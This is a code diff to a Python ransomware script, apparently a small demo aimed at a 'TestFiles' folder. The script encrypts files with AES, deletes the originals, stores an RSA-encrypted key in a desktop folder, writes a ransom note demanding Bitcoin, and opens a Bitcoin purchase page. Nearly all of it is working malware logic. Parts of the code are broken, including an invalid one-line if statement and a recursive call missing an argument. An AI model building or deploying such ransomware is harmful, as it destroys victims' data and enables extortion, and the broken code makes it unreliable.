@@ -1,7 +1,7 @@
-import Crypto, ast, os, sys, glob, socket, base64, hashlib, tkinter, webbrowser, time, random, io, base64
+import Crypto, ast, os, sys, glob, socket, base64, hashlib, Tkinter, webbrowser, time, random, io, base64
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
-from tkinter import *
+from Tkinter import *
 from Crypto import Random
 from os.path import expanduser
 from urllib2 import urlopen
@@ -24,7 +24,7 @@ def encrypt_file(key, file_name):
         plaintext = fo.read()
     enc = encrypt(plaintext, key)
     with open(file_name + ".enc", 'wb') as fo:
-        fo.write(enc)
+        fo.write(str(enc))
     os.remove(file_name)
 
 def decrypt(ciphertext, key):
@@ -62,16 +62,17 @@ def traverse_files(nwd, aes_key, depth):
                 #print("|" + (depth*'- ') + "D: " + os.path.basename(os.path.normpath(path)))
         files = []
 
-def display_note(dir):
+def display_note(directory, loop):
 
-    note = """ Q: What has happened to my computer
+    note = """ Q: What has happened to my computer?
 
-    All of your files have been encrypted using AES encryption.
+    All of your files have been encrypted. Your decyption key is in the 'RANSOM_INFO'
+    folder on your desktop. We suggest you don't tamper with it.
 
 
 Q: Can I recover my files?
 
-    Yes you can. Just send $300 of Bitcoin to this Bitcoin address:
+    Yes you can. Just send $100 of Bitcoin to this Bitcoin address:
 
                   1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
 
@@ -83,9 +84,11 @@ Q: Can I recover my files?
     will send you the decryption program.
     """
 
-    f = open (dir + "/RANSOMNOTE.txt", 'w')
+    f = open (os.path.join(directory, "RANSOM_NOTE.txt"), 'w')
     f.write(note) #write ciphertext to file
     f.close()
+    
+    if(loop == 0) webbrowser.open('https://www.coinbase.com/buy-bitcoin')
 
     master = Tk()
     master.title('RANSOMWARE ATTACK')
@@ -93,7 +96,8 @@ Q: Can I recover my files?
     msg.config(bg='red', font=('times', 24, 'italic'))
     msg.pack()
     mainloop()
-    display_note()
+    webbrowser.open('https://www.coinbase.com/buy-bitcoin')
+    display_note(directory)
 
 def main():
     #### PUBLIC ENCRYPTION KEY WILL BE ADDED HERE ####
@@ -104,27 +108,26 @@ def main():
 
     #generate a random AES key, pass it to the traverse function which will
     #use it for encrypting individual files
-    #represented in bytes 32 bytes = 256 bits
+    #represented in bytes 16 bytes = 128 bits
     aes_key = os.urandom(32)
 
     #start from the home directory, pass it to the traverse function
-    home = expanduser('~')
-    cwd = home + '/TestFiles'
+    home = os.environ['HOME']
+    cwd = os.path.join(home, 'TestFiles')
     print(cwd + "\n")
     traverse_files(cwd, aes_key, 0)
 
     encrypted_key = pub_key.encrypt(aes_key, 32)
 
-    home = expanduser('~')
-    info_dir = home + '/Desktop/INFO'
+    info_dir = os.path.join(home, 'Desktop', 'RANSOM_INFO')
     if not os.path.exists(info_dir):
         os.makedirs(info_dir)
 
-    f = open (info_dir + "/encryptedKey.txt", 'w')
+    f = open (os.path.join(info_dir, 'encryptedKey.txt'), 'w')
     f.write(str(encrypted_key)) #write ciphertext to file
     f.close()
 
-    display_note(info_dir)
+    display_note(info_dir, 0)
 
 if __name__ == "__main__":
     main()
